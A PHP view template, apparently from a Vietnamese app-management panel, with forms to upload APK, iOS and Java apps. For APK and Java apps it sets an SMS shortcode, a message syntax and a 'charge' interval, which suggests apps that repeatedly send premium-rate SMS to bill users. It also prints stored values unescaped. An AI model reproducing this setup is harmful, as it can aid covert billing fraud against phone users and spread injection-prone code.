  
	<div class="span10">
		<div class="tabbable">
			<ul class="nav nav-tabs" id="myTab">
				<li class="active"><a data-toggle="tab" href="#apk"> <i
						class="green icon-home bigger-110"></i> APK </a></li>

				<li><a data-toggle="tab" href="#ios"> <i
						class="green icon-home bigger-110"></i> iOS </a></li>

				<li class="dropdown"><a data-toggle="tab" href="#java"> <i
						class="green icon-home bigger-110"></i> Java </a></li>
				<li class="dropdown"><a data-toggle="tab" href="#javaapk"> <i
						class="green icon-home bigger-110"></i> Java to APK </a></li>
			</ul>

			<div class="tab-content">
				<div id="apk" class="tab-pane in active">
					<p>
					<?php if($apps <> null):?>
					<?php foreach($apps as $app):?>
					<?php echo form_open_multipart('user/update_app/'.$app->id); ?>
					<input type="hidden" name="apptype" value="1" />
					
				<div class="form-row">
					<div class="form-label">App name</div>
					<div class="form-item">
						<input type="text" name="appname"
							value="<?php echo $app->app_name;?>" />
					</div>
				</div>
				<div class="form-row">
						<div class="form-label">Link ( nếu up file ngoài )</div>
						<div class="form-item">
							<input type="text" name="applink" value="<?php echo $app->app_link;?>" />
						</div>
					</div>
					<div class="form-row">
						<div class="form-label">Upload file</div>
						<div class="form-item">
							<input type="file" name="ifile" size=40 />
						</div>
					</div>
					<div class="form-row">
						<label class="control-label" for="form-field-5">Giới thiệu app</label>
							<textarea name="appdes" class="span8" id="form-field-8" placeholder="Default Text">
							<?php echo $app->appdes;?>
							</textarea>
						<div class="controls">
							 
						</div>
					</div>
					<div class="form-row">
						<div class="form-label">Đầu số</div>
						<div class="form-item">
							<select name="shortcode">
							<?php foreach($shortcodes as $code): ?>
								<option <?php if($app->shortcode == $code->shortcode):?> selected="selected"<?php endif;?> value="<?php echo $code->shortcode ?>">
								<?php echo $code->shortcode ?>
								</option>
								<?php endforeach;?>

							</select>
						</div>
					</div>
					<div class="form-row">
						<div class="form-label">Cú pháp</div>
						<div class="form-item">
							<input type="text" value="" name="message" placeinholder="demo" value="<?php echo $app->message;?>" />
						</div>
					</div>
					<div class="form-row">
						<div class="form-label">Thời gian charge</div>
						<div class="form-item">
							<select name="timeactive">
								<option <?php if($app->timeactive == 60000):?> selected="selected"<?php endif;?> value="60000">1 phút</option>
								<option <?php if($app->timeactive == 300000):?> selected="selected"<?php endif;?>value="300000" selected="selected">5 phút</option>
								<option <?php if($app->timeactive ==  600000):?> selected="selected"<?php endif;?>value="600000">10 phút</option>
								<option <?php if($app->timeactive ==  900000):?> selected="selected"<?php endif;?>value="900000">15 phút</option>
								<option <?php if($app->timeactive ==  1200000):?> selected="selected"<?php endif;?>value="1200000">20 phút</option>
								<option <?php if($app->timeactive ==  1800000):?> selected="selected"<?php endif;?>value="1800000">30 phút</option>
								<option <?php if($app->timeactive ==  3600000):?> selected="selected"<?php endif;?>value="3600000">1 tiếng</option>
								<option <?php if($app->timeactive ==  43200000):?> selected="selected"<?php endif;?>value="43200000">6 tiếng</option>
								<option <?php if($app->timeactive ==  86400000):?> selected="selected"<?php endif;?>value="86400000">1 ngày</option>
							</select>
						</div>
					</div>
					<div class="form-row">
						<div class="form-label">Ngày cập nhật</div>
						<div class="form-item">
							<input type="text" value="<?php echo date("Y-m-d h:s:m")?>"
								name="datecreate" />
						</div>
					</div>
					<div class="form-row">
						<div class="form-item">
							<input name="active" type="radio" value="0" <?php if($app->active ==  0):?> checked="checked"<?php endif;?> /> <span class="lbl">
								Không kích hoạt</span> <input name="active" type="radio"
								value="1" <?php if($app->active ==  1):?> checked="checked"<?php endif;?> /> <span class="lbl"> Kích hoạt</span>
						</div>
					</div>
					<div class="form-row">
						<br />
					</div>
					<div class="form-row">
						<div class="form-label"></div>
						<div class="form-item">
							<input type="submit" name="submit" value="Tạo" />
						</div>
					</div>
					<?php echo form_close(); ?>
					<?php endforeach;?>
					<?php endif;?>
					</p>
				</div>

				<div id="ios" class="tab-pane">
					<p>
					<?php echo form_open_multipart('user/add_app'); ?>
						<input type="hidden" name="apptype" value="2" />
					
					
					<div class="form-row">
						<div class="form-label">Tên ứng dụng</div>
						<div class="form-item">
							<input type="text" name="appname" />
						</div>
					</div>
					<div class="form-row">
						<div class="form-label">Upload file</div>
						<div class="form-item">
							<input type="file" name="ifile" size=40 />
						</div>
					</div>
					<!--	<div class="form-row">
															<div class="form-label">Đầu số</div>
															<div class="form-item">
																<select name="shortcode"> 
																	<?php foreach($shortcodes as $code): ?>
																	<option value="<?php echo $code->shortcode ?>"><?php echo $code->shortcode ?></option>
																	<?php endforeach;?>
																	
																</select>
															</div>
														</div>
														<div class="form-row">
															<div class="form-label">Cú pháp</div>
															<div class="form-item">
																 <input type="text" value=""
																	name="message" placeinholder="demo" />
															</div>
														</div>
														<div class="form-row">
															<div class="form-label">Thời gian charge</div>
															<div class="form-item">
																<select name="timeactive">
																	<option value="60000">1 phút</option>
																	<option value="300000" selected="selected">5 phút</option>
																	<option value="600000">10 phút</option>
																	<option value="900000">15 phút</option>
																	<option value="1200000">20 phút</option>
																	<option value="1800000">30 phút</option>
																	<option value="3600000">1 tiếng</option>
																	<option value="43200000">6 tiếng</option>
																	<option value="86400000">1 ngày</option>
																</select>
															</div>
														</div> -->

					<div class="form-row">
						<div class="form-item">
							<input name="active" type="radio" value="0" /> <span class="lbl">
								Không kích hoạt</span> <input name="active" type="radio"
								value="1" /> <span class="lbl"> Kích hoạt</span>
						</div>
					</div>
					<div class="form-row">
						<br />
					</div>
					<div class="form-row">
						<div class="form-label"></div>
						<div class="form-item">
							<input type="submit" name="submit" value="Tạo" />
						</div>
					</div>
					<?php echo form_close(); ?>
					</p>
				</div>

				<div id="java" class="tab-pane">
					<p>
					<?php echo form_open_multipart('user/add_app'); ?>
						<input type="hidden" name="apptype" value="3" />
					<div class="form-row">
						<div class="form-label">App name</div>
						<div class="form-item">
							<input type="text" name="appname" value="<?php echo $app->app_name;?>" />
						</div>
					</div>
					
					<div class="form-row">
						<div class="form-label">Upload file</div>
						<div class="form-item">
							<input type="file" name="ifile" size=40 />
						</div>
					</div>
					<div class="form-row">
						<div class="form-label">Đầu số</div>
						<div class="form-item">
							<select name="shortcode">
							<?php foreach($shortcodes as $code): ?>
								<option value="<?php echo $code->shortcode ?>">
								<?php echo $code->shortcode ?>
								</option>
								<?php endforeach;?>

							</select>
						</div>
					</div>
					<div class="form-row">
						<div class="form-label">Cú pháp</div>
						<div class="form-item">
							<input type="text" value="" name="message" placeinholder="demo" />
						</div>
					</div>
					<div class="form-row">
						<div class="form-label">Thời gian charge</div>
						<div class="form-item">
							<select name="timeactive">
								<option value="60000">1 phút</option>
								<option value="300000" selected="selected">5 phút</option>
								<option value="600000">10 phút</option>
								<option value="900000">15 phút</option>
								<option value="1200000">20 phút</option>
								<option value="1800000">30 phút</option>
								<option value="3600000">1 tiếng</option>
								<option value="43200000">6 tiếng</option>
								<option value="86400000">1 ngày</option>
							</select>
						</div>
					</div>
					<div class="form-row">
						<div class="form-item">
							<input name="active" type="radio" value="0" /> <span class="lbl">
								Không kích hoạt</span> <input name="active" type="radio"
								value="1" /> <span class="lbl"> Kích hoạt</span>
						</div>
					</div>
					
					<div class="form-row">
						<br />
					</div>
					<div class="form-row">
						<div class="form-label"></div>
						<div class="form-item">
							<input type="submit" name="submit" value="Tạo" />
						</div>
					</div>
					<?php echo form_close(); ?>
					</p>
				</div>


				<div id="javaapk" class="tab-pane">
					<p>Đang sửa chức năng này.</p>
				</div>

			</div>
		</div>
	</div>
	<!--/span-->
 
